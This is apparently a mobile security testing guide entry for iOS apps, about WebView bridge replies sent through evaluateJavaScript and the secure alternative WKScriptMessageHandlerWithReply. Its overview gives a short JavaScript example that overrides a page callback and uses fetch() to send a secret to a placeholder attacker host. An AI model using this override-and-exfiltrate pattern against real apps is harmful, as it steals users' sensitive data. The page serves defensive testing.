---
platform: ios
title: References to evaluateJavaScript Used as Bridge Reply in WKScriptMessageHandler
id: MASTG-TEST-0x02
type: [static]
weakness: MASWE-0069
best-practices: [MASTG-BEST-0x05]
profiles: [L1, L2]
knowledge: [MASTG-KNOW-0076]
---

## Overview

When a `WKScriptMessageHandler` receives a message from JavaScript and needs to return data, a common pattern is to call [`evaluateJavaScript:completionHandler:`](https://developer.apple.com/documentation/webkit/wkwebview/evaluatejavascript(_:completionhandler:)) to invoke a JavaScript callback such as `window.receiveData(...)`. This injects the response data into the page's JavaScript context (the `.page` world), making it accessible to any script running on the page.

If an attacker can execute JavaScript in the WebView (for example through XSS or content injection), they can intercept that data by overriding the global callback function before the bridge handler fires it:

```javascript
// Attacker overrides the callback before the native handler responds
window.receiveSecret = function(secret) {
    fetch("https://attacker.example.com/?leak=" + secret);
};
```

The secure alternative is [`WKScriptMessageHandlerWithReply`](https://developer.apple.com/documentation/webkit/wkscriptmessagehandlerwithreply), which returns the reply directly to the calling content world via a Promise without writing anything into the page context.

This test checks whether the app uses `evaluateJavaScript:completionHandler:` within `WKScriptMessageHandler` implementations to return data to page JavaScript.

## Steps

1. Use @MASTG-TECH-0058 to extract the app.
2. Use @MASTG-TOOL-0073 on the app binary, looking for calls to `evaluateJavaScript:completionHandler:` and their enclosing function symbols.

## Observation

The output should contain a list of locations where `evaluateJavaScript:completionHandler:` is called, along with the symbol names of the functions that contain those calls.

## Evaluation

The test fails if `evaluateJavaScript:completionHandler:` is called and the injected JavaScript string contains or derives from sensitive data. Refer to @MASTG-BEST-0x05 for the recommended alternative.
